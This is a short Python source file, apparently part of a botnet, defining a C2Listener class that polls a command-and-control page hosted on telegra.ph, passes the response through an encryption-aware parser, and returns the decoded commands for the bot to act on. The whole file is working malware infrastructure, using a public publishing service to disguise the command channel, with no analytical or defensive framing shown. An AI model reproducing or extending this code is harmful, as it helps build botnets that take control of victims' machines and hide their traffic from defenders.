import requests
import bots.Parser as Parser
from bots.Cryptographic import Cryptographic

# Returns commands from C2 server
class C2Listener:
    def __init__(self, crypt: Cryptographic):
        self.C2_URL = "https://telegra.ph/BNS-TESTING-03-10"
        self.parser = Parser.Parser(crypt)


    # pull commands from C2 server
    def pull_commands(self):
        r = requests.get(self.C2_URL)

        if r.status_code == 200:
            command = self.parser.parse_command(r)
            print(f"Bot pulled commands: {command}")
            return command
        else:
            print(f"Bot failed to pull commands.")
            return "None"